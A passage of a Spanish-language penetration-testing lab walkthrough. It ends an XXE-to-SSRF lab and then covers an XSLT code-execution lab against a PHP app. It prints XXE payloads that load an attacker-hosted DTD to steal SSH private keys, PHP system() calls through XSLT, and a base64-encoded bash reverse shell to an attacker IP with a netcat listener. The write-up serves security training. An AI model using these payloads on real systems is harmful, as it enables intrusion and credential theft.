Envíe la misma carga útil XXE que enviamos en el último paso:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

Se recupera la lista de directorios para el directorio .ssh:

Guarde el contenido HTML recuperado:

Mandar:

```
cat listing.html
```

Abra el archivo listing.html en el navegador:

URL:

```
file:///root/listing.html
```

Tenga en cuenta que hay tres archivos en el directorio .ssh:

```
authorized_keys
id_rsa
id_rsa.pub
```

En los pasos siguientes, obtendremos algunos de estos archivos.

Paso 10: Recupera las claves SSH privadas.

Modifique el archivo evil.dtd para obtener el contenido de id\_rsa archivo:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

Inicie un servidor HTTP basado en Python en el puerto 8080:

Mandar:

```
python3 -m http.server 8080
```

Envíe la misma carga útil XXE que enviamos en el último paso:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

La respuesta contiene las claves SSH privadas.

Guarde el contenido de las claves privadas en el archivo id\_rsa:

Mandar:

```
cat id_rsa
```

A la clave SSH privada le faltan las nuevas líneas.

Para restaurar el archivo, podemos usar el siguiente comando:

Mandar:

```
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
-e "s/-----END RSA PRIVATE KEY-----/\n&/" \
-e "s/\S\{64\}/&\n/g" \
id_rsa
```

La salida contiene la clave SSH privada con el formato correcto.

El comando anterior hace lo siguiente: - Agrega una nueva línea después de la función

```
-----BEGIN RSA PRIVATE KEY-----
string - Adds a new line before the
-----END RSA PRIVATE KEY-----
string - For all other string blocks, it adds a new line after every 64 characters
```

Utilice el siguiente comando para guardar la clave privada formateada en el archivo fixed\_id\_rsa:

Mandar:

```
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
-e "s/-----END RSA PRIVATE KEY-----/\n&/" \
-e "s/\S\{64\}/&\n/g" \
id_rsa > fixed_id_rsa
```

Compruebe el contenido del archivo fixed\_id\_rsa:

Mandar:

```
cat fixed_id_rsa
```

La clave SSH privada bien formateada se ha colocado en un archivo.

Paso 11: Obtenga acceso SSH en la máquina de destino.

Tenemos la clave SSH privada, pero aún no sabemos el usuario al que pertenece.

Para usar las claves SSH para iniciar sesión, tenemos que averiguar el nombre de usuario correspondiente. Para ello, utilizaremos las claves SSH públicas. Este archivo puede contener el correo electrónico del usuario o el nombre de la cuenta seguido del nombre de host. En cualquiera de los dos casos, encontraremos el nombre de usuario.

Modifique el archivo evil.dtd para obtener el contenido del archivo id\_rsa.pub:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

Inicie un servidor HTTP basado en Python en el puerto 8080:

Mandar:

```
python3 -m http.server 8080
```

Envíe la misma carga útil XXE que enviamos en el último paso:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

El contenido de la clave SSH pública se recuperó correctamente.

También se revela la identificación de correo electrónico del usuario:

```
david@insecure-corp.com
```

Modifique los permisos del archivo fixed\_id\_rsa y SSH en la máquina de destino:

Comandos:

```
chmod 600 fixed_id_rsa
ssh -i fixed_id_rsa david@demo.ine.local
```

> ¡El inicio de sesión SSH fue exitoso!

Paso 12: Recupera la segunda bandera.

Ahora que tenemos acceso SSH a la máquina de destino, podemos emitir comandos para realizar el reconocimiento y recuperar todas las banderas.

Comandos:

```
id
ls
cat flag1 
find / -iname 'flag*' 2>/dev/null 
```

```
Flag 1 (/home/david/flag1): 5f1210be00b4b8dfecba7b56181d905c
```

La marca 2 se almacena en el archivo /tmp/flag2:

Mandar:

```
cat /tmp/flag2
```

```
Flag 2: 173b0344950d28e8b5dc36dd462edaa9
```

Con esto, concluimos este laboratorio. Hemos aprendido a aprovechar una vulnerabilidad XXE para realizar un ataque SSRF. Usando el ataque SSRF, interactuamos con un servidor HTTP interno, obtuvimos las claves SSH de un usuario y obtuvimos acceso al shell en la máquina de destino.

#### Referencias <a href="#references" id="references"></a>

```
1 - A4:2017-XML External Entities (XXE)
2 - A10:2021 – Server-Side Request Forgery (SSRF)
3 - XML CDATA

1 - https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)
2 - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
3 - https://www.w3resource.com/xml/CDATA-sections.php
```

### Laboratorio 2 - Ejecución de XSLT a código <a href="#lab-2---xslt-to-code-execution" id="lab-2---xslt-to-code-execution"></a>

Solución

Paso 1: Abra el enlace del laboratorio para acceder a la instancia de la GUI de Kali.

...

Paso 2: Compruebe si se puede acceder a la máquina/dominio proporcionado.

Mandar:

```
ping -c3 demo.ine.local
```

Se puede acceder a la máquina suministrada.

Paso 3: Verifique los puertos abiertos en la máquina proporcionada.

Mandar:

```
nmap -sS -sV demo.ine.local
```

> El servidor web Apache se ejecuta en el puerto 80 de la máquina de destino.

Paso 4: Compruebe la pila de aplicaciones web.

Usaremos curl para verificar los encabezados de respuesta e identificar la pila de aplicaciones:

Mandar:

```
curl -I demo.ine.local
```

> Observe que la salida indica que el servidor web es Apache (que ya conocemos por el escaneo de Nmap) y que la aplicación web backend está basada en PHP.

Paso 5: Compruebe las páginas web servidas en el equipo de destino.

Abra la siguiente URL en el navegador:

```
URL: http://demo.ine.local/
```

Se proporciona una aplicación de servicio de transformación en línea. Espera que el usuario cargue un archivo XML y un archivo XSL. Una vez cargados ambos archivos, el archivo XML se transforma de acuerdo con las instrucciones del archivo XSL.

```
Information: XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.

Reference: https://www.w3schools.com/xml/xsl_intro.asp
```

Paso 6: Guarde un archivo XML de prueba y un archivo XSL para detectar la información del motor XSLT de backend.

Guarde el siguiente contenido como test.xml:

```
# test.xml:

<?xml version="1.0"?>
<root>Hello, World!</root>
```

Guarde el siguiente contenido como test.xsl:

test.xsl:

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html"/>
  <xsl:template match="/">
  <h2>XSLT Engine Info:</h2>
  <b>Version:</b><xsl:value-of select="system-property('xsl:version')" /><br/>
  <b>Vendor:</b><xsl:value-of select="system-property('xsl:vendor')" /><br/>
  <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
  </xsl:template>
</xsl:stylesheet>
```

Observe el contenido del archivo XSL. Contiene las etiquetas xsl para extraer la información sobre el motor XSLT utilizado por el backend:

```
xsl:version
xsl:vendor
xsl:vendor-URL
```

Paso 7: Cargue el archivo XML guardado en el servidor.

Seleccione el archivo XML que desea cargar:

* Cargue el archivo XML en el servidor
* El archivo XML se ha cargado correctamente

Paso 8: Sube el archivo XSL guardado al servidor.

* Seleccione el archivo XSL que desea cargar
* Cargue el archivo XSL en el servidor

> El archivo XSL se ha cargado correctamente

Paso 9: Transforme el archivo XML de acuerdo con el archivo XSL cargado.

* Haga clic en el botón de transformación para procesar y transformar el archivo XML de acuerdo con el archivo XSL cargado
* Se nos redirige a la página /transform.php que contiene los detalles del motor XSLT

El backend ejecuta la versión 1.0 de XSLT y el proveedor es libxslt, que es uno de los procesadores XSLT más populares y utilizados.

Paso 10: Explotar el procesador XSLT para ejecutar comandos arbitrarios.

> A estas alturas, hemos entendido que el backend está ejecutando PHP y usando el procesador libxslt. Además, el procesador analiza los archivos suministrados por el usuario sin ningún tipo de saneamiento, en la medida en que lo hemos usado.

Ahora intentaremos ejecutar funciones PHP desde el archivo XSL. Esto solo funcionará si registerPHPFunctions está habilitado para el procesador XSLT, como se muestra en la siguiente publicación: https://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls

Para probar esto, subiremos otro archivo XSL. Regrese a la página de índice de la aplicación:

```
URL: http://demo.ine.local
```

Guarde el siguiente contenido en el archivo test.xslt:

test.xsl:

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
  <xsl:template match="/">
    <html>
       <!-- We use the php suffix to call the functions -->
       <xsl:value-of select="php:function('system','uname -a')" />
       <!-- Output: 'Php Can Now Be Used In Xsl' -->
    </html>
  </xsl:template>
</xsl:stylesheet>
```

> Tenga en cuenta que hemos especificado el comando uname -a que se ejecutará a través de la función del sistema PHP.

Si el código de procesamiento XSLT del backend ha registrado funciones PHP, entonces se ejecutará el código anterior y veremos la salida del comando uname -a en la página resultante.

Cargue el archivo XSL modificado:

* Ahora haz clic en el botón ¡Transformar! botón
* Observe que la salida del comando uname -a se muestra en la página resultante:

> Esto confirma que el código de procesamiento XSLT del backend ha registrado funciones PHP. Esta configuración es inherentemente vulnerable porque los archivos XSL proporcionados por el usuario se procesan tal cual, sin ningún tipo de saneamiento o filtrado.

Paso 11: Obtenga un shell inverso en el servidor de destino.

Compruebe la dirección IP de la máquina atacante:

Mandar:

```
ip addr
```

La dirección IP de la máquina atacante es 192.170.91.2/24.

> \[Nota] La dirección IP asignada a su instancia de Kali GUI sería ciertamente diferente. Asegúrese de reemplazarlo en los comandos posteriores.

A continuación, codificaremos en base64 la carga útil del shell inverso para evitar que se manipule mientras se carga a través de HTTP:

Mandar:

```
echo "/bin/bash -c 'bash -i>& /dev/tcp/192.170.91.2/54321 0>&1'" | base64 -w0 ; echo
```

> \[Nota] Asegúrese de reemplazar la dirección IP en el comando anterior.

Agregue la carga útil de shell inverso en el archivo XSL:

test.xsl:

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
  <xsl:template match="/">
    <html>
      <!-- We use the php suffix to call the functions -->
      <xsl:value-of select="php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')" />
        <!-- Output: 'Php Can Now Be Used In Xsl' -->
      </html>
  </xsl:template>
</xsl:stylesheet>
```

> Tenga en cuenta que hemos agregado comandos para decodificar y ejecutar la carga útil de shell inverso en el servidor backend.

Inicie un agente de escucha de Netcat en la máquina atacante:

Mandar:

```
nc -lvp 54321
```

* Cargue el archivo XSL modificado:
* Ahora haz clic en el botón ¡Transformar! botón
* Observe que la página sigue cargándose
* Compruebe el terminal en el que se estaba ejecutando el agente de escucha de Netcat

> Hemos recibido una sesión de shell inverso del servidor de destino.

Paso 12: Recupera la bandera.

Ahora que tenemos una sesión de shell en el servidor de destino, podemos ejecutar comandos del sistema operativo y realizar alguna enumeración:

Comandos:

```
id
ps aux
```

Ejecute el siguiente comando para localizar el archivo de indicadores:

Mandar:

```
find / -iname *flag* 2>/dev/null
```

> La marca está presente en el archivo /flag.txt.

Lea el contenido del archivo de indicadores:

Mandar:

```
cat /flag.txt
```

```
FLAG: fdf9c7da429441eaa1620eceafc34d9f
```

* Con eso, concluimos este laboratorio sobre el aprovechamiento de XSLT para la ejecución de código.

#### Referencias <a href="#references-1" id="references-1"></a>

```
https://www.w3schools.com/xml/xsl_intro.asp
https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5
https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls
```
